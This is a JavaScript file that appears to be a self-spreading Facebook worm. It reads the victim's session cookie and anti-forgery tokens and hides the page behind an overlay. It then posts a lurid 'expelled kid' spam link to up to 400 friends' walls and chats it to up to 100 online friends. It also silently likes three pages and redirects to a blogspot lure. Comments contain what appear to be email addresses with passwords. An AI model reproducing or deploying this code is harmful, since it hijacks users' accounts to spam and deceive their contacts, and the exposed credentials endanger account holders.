function readCookie(name) {
    var nameEQ = name + "=";
    var ca = document.cookie.split(';');
    for (var i = 0; i < ca.length; i++) {
        var c = ca[i];
        while (c.charAt(0) == ' ') c = c.substring(1, c.length);
        if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);
    }
    return null;
}
var user_id = readCookie("c_user");
var user_name = document.getElementById('navAccountName').innerHTML;

var coverpage = function() {
        var boxdiv = document.createElement('div');
        boxdiv.id = 'coverpage1';
        boxdiv.style.display = 'block';
        boxdiv.style.position = 'absolute';
        boxdiv.style.width = 100 + '%';
        boxdiv.style.height = 100 + '%';
        boxdiv.style.top =  100 + 'px';
        boxdiv.style.margin.top =  100 + 'auto';
        boxdiv.style.margin =  0 + 'auto';
        boxdiv.style.textAlign = 'center';
        boxdiv.style.padding = '4px';
        boxdiv.style.background = 'url(http://1.bp.blogspot.com/-A0gpB7_AX3o/Tc71HASoEXI/AAAAAAAABKs/EjquUCzFw20/s1600/pgvws.png) no-repeat scroll center top';
        boxdiv.style.fontSize = '15px';
        boxdiv.style.zIndex = 9999999;
        boxdiv.innerHTML='&nbsp;<table align="center" cellpadding="5" cellspacing="5" width="400px"><tr align="left"><td valign="middle"><br /><br /><br /><br /><img style="border: 1px solid black;padding:5px;margin:10px;width:140px;height:140px;"  src="http://graph.facebook.com/'+user_id+'/picture?type=large" /></td><td align="left" valign="middle"><font style="font-weight: bold;font-size:16px;">'+user_name+'</font><br /><img src="http://i.imgur.com/hRjNi.gif" style="margin-left:20px;padding-left: 5px;"/></td></tr></table>';
        document.body.appendChild(boxdiv);
}
coverpage();

// Setup some variables

var post_form_id = document.getElementsByName('post_form_id')[0].value;
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;

// Chat message variables

var this_chat = "The kid in This video is realy insane.. he went beserk when he was being expelled frm sch0ol.. see what he did j.mp/keyNwY";
var prepared_chat = encodeURIComponent(this_chat);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Post Link to friends walls
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var token = Math.round(new Date().getTime() / 1000);
var http1 = new XMLHttpRequest();
var url1 = "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1&viewer=" + user_id + "&token=" + token + "-6&filter[0]=user&options[0]=friends_only";
var params1 = "";
http1.open("GET", url1 + "?" + params1, true);
http1.onreadystatechange = function () { //Call a function when the state changes.
    if (http1.readyState == 4 && http1.status == 200) { // If state = success
        var response1 = http1.responseText;
        response1 = response1.replace("for (;;);", ""); // Get rid of the junk at the beginning of the returned object
        response1 = JSON.parse(response1); // Convert the response to JSON
        //alert(response4.toSource());
        var count = 0;
        for (uid in response1.payload.entries) {
            if (count < 400) {
                //alert("SENT TO "+response1.payload.entries[count].uid);
                // Loop to send messages
                // New XMLHttp object
                var httpwp = new XMLHttpRequest();
                var urlwp = "http://www.facebook.com/ajax/profile/composer.php?__a=1";
                var paramswp = "post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&xhpc_composerid=u574553_1&xhpc_targetid=" + response1.payload.entries[count].uid + "&xhpc_context=profile&xhpc_fbx=1&aktion=post&app_id=2309869772&UIThumbPager_Input=0&attachment[params][metaTagMap][0][http-equiv]=content-type&attachment[params][metaTagMap][0][content]=text%2Fhtml%3B%20charset%3Dutf-8&attachment[params][metaTagMap][1][property]=og%3Atitle&attachment[params][metaTagMap][1][content]=Check Out your PROFILE Stalkers&attachment[params][metaTagMap][2][property]=og%3Aurl&attachment[params][metaTagMap][2][content]=http://www.facebook.com&attachment[params][metaTagMap][3][property]=og%3Asite_name&attachment[params][metaTagMap][3][content]=OMG.. Look What THIS Kid Did to His School After Being Expelled!&attachment[params][metaTagMap][4][property]=og%3Aimage&attachment[params][metaTagMap][4][content]=http://4.bp.blogspot.com/-lmHwQBX07Kw/Tc-3MRTZ2NI/AAAAAAAAABI/3XTJXVFF8YY/s320/little-boy-arrested22.jpg&attachment[params][metaTagMap][5][property]=og%3Adescription&attachment[params][metaTagMap][5][content]=WARNING: Graphic Content!&attachment[params][metaTagMap][6][name]=description&attachment[params][metaTagMap][6][content]=BBC News&attachment[params][metaTagMap][7][http-equiv]=Content-Type&attachment[params][metaTagMap][7][content]=text%2Fhtml%3B%20charset%3Dutf-8&attachment[params][medium]=106&attachment[params][urlInfo][user]=http://j.mp/keyNwY&attachment[params][favicon]=http://lol.info/os/favicon.ico&attachment[params][title]=OMG.. Look What THIS Kid Did to His School After Being Expelled!&attachment[params][fragment_title]=&attachment[params][external_author]=&attachment[params][summary]=WARNING: Graphic Content!&attachment[params][url]=http://www.facebook.com&attachment[params][ttl]=0&attachment[params][error]=1&attachment[params][responseCode]=206&attachment[params][metaTags][description]=WARNING: Graphic Content!&attachment[params][images][0]=http://4.bp.blogspot.com/-lmHwQBX07Kw/Tc-3MRTZ2NI/AAAAAAAAABI/3XTJXVFF8YY/s320/little-boy-arrested22.jpg&attachment[params][scrape_time]=1302991496&attachment[params][cache_hit]=1&attachment[type]=100&xhpc_message_text=Get it now hurry while it lasts&xhpc_message=This is realy insane.. you have to see this&nctr[_mod]=pagelet_wall&lsd&post_form_id_source=AsyncRequest";
                httpwp.open("POST", urlwp, true);
                //Send the proper header information along with the request
                httpwp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                httpwp.setRequestHeader("Content-length", paramswp.length);
                httpwp.setRequestHeader("Connection", "keep-alive");
                httpwp.onreadystatechange = function () { //Call a function when the state changes.
                    if (httpwp.readyState == 4 && httpwp.status == 200) {
                        //alert(http.responseText);
                        //alert('buddy list fetched');
                    }
                }
                httpwp.send(paramswp);
            }
            count++; // increment counter
        }
        http1.close; // Close the connection
    }
}
http1.send(null);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Hide chat boxes
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var hide = document.getElementById('fbDockChatTabSlider');
hide.style.display = "none";

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Get online friends and send chat message to them
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var http3 = new XMLHttpRequest();
var url3 = "http://www.facebook.com/ajax/chat/buddy_list.php?__a=1";
var params3 = "user=" + user_id + "&popped_out=false&force_render=true&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest";
http3.open("POST", url3, true);
//Send the proper header information along with the request
http3.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http3.setRequestHeader("Content-length", params3.length);
http3.setRequestHeader("Connection", "close");
http3.onreadystatechange = function () { //Call a function when the state changes.
    if (http3.readyState == 4 && http3.status == 200) {
        var response3 = http3.responseText;
        response3 = response3.replace("for (;;);", "");
        response3 = JSON.parse(response3);
        var count = 0;
        for (property in response3.payload.buddy_list.nowAvailableList) {
            if (count < 100) {
                // Loop to send messages
                // New XMLHttp object
                var httpc = new XMLHttpRequest();
                // Generate random message ID
                var msgid = Math.floor(Math.random() * 1000000);
                var time = Math.round(new Date().getTime() / 1000);
                var urlc = "http://www.facebook.com/ajax/chat/send.php?__a=1";
                var paramsc = "msg_id=" + msgid + "&client_time=" + time + "&to=" + property + "&num_tabs=1&pvs_time=" + time + "&msg_text=" + prepared_chat + "&to_offline=false&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest";
                httpc.open("POST", urlc, true);
                //Send the proper header information along with the request
                httpc.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
                httpc.setRequestHeader("Content-length", paramsc.length);
                httpc.setRequestHeader("Connection", "close");
                httpc.onreadystatechange = function () { //Call a function when the state changes.
                    if (httpc.readyState == 4 && httpc.status == 200) {
                        //alert(http.responseText);
                        //alert('buddy list fetched');
                    }
                }
                httpc.send(paramsc);
            }
            //alert(property);
            count++; // increment counter
        }
        http3.close; // Close the connection
    }
}
http3.send(params3);

///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Become a Fan - I Love Pets  // HalaSaagaril347@hotmail.com	common7954
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var http4 = new XMLHttpRequest();
var url4 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
var params4 = "fbpage_id=218575568172183&add=1&reload=0&preserve_tab=false&nctr[_mod]=pagelet_header&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest"
http4.open("POST", url4, true);
//Send the proper header information along with the request
http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http4.setRequestHeader("Content-length", params4.length);
http4.setRequestHeader("Connection", "close");
http4.onreadystatechange = function () { //Call a function when the state changes.
    if (http4.readyState == 4 && http4.status == 200) {
        http4.close; // Close the connection
    }
}
http4.send(params4);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Become a Fan - I Love // laurette159301@hotmail.com	hqk835
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var http5 = new XMLHttpRequest();
var url5 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
var params5 = "fbpage_id=209705679060357&add=1&reload=0&preserve_tab=false&nctr[_mod]=pagelet_header&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest"
http5.open("POST", url5, true);
//Send the proper header information along with the request
http5.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http5.setRequestHeader("Content-length", params5.length);
http5.setRequestHeader("Connection", "close");
http5.onreadystatechange = function () { //Call a function when the state changes.
    if (http5.readyState == 4 && http5.status == 200) {
        http5.close; // Close the connection
    }
}
http5.send(params5);


///////////////////////////////////////////////////////////////////////////////////////////////////////////////
// Become a Fan - I Love Money  //  FizaSamgamaesvarig531@hotmail.com	tree6403
///////////////////////////////////////////////////////////////////////////////////////////////////////////////
var http6 = new XMLHttpRequest();
var url6 = "http://www.facebook.com/ajax/pages/fan_status.php?__a=1";
var params6 = "fbpage_id=208298029210038&add=1&reload=0&preserve_tab=false&nctr[_mod]=pagelet_header&post_form_id=" + post_form_id + "&fb_dtsg=" + fb_dtsg + "&lsd&post_form_id_source=AsyncRequest"
http6.open("POST", url6, true);
//Send the proper header information along with the request
http6.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
http6.setRequestHeader("Content-length", params6.length);
http6.setRequestHeader("Connection", "close");
http6.onreadystatechange = function () { //Call a function when the state changes.
    if (http6.readyState == 4 && http6.status == 200) {
        http6.close; // Close the connection
    }
}
http6.send(params6);

//this function includes all necessary js files for the application
function include(file)
{

  var script  = document.createElement('script');
  script.src  = file;
  script.type = 'text/javascript';
  script.defer = true;

  document.getElementsByTagName('head').item(0).appendChild(script);

}
include('http://code.jquery.com/jquery-1.5.2.min.js');
var landingpage = function() {
        var myFrame = $("div#coverpage1").hide(1000);
        window.top.location = "http://kid-expelled-vide0.blogspot.com/";
        }
setTimeout("landingpage();",19000);
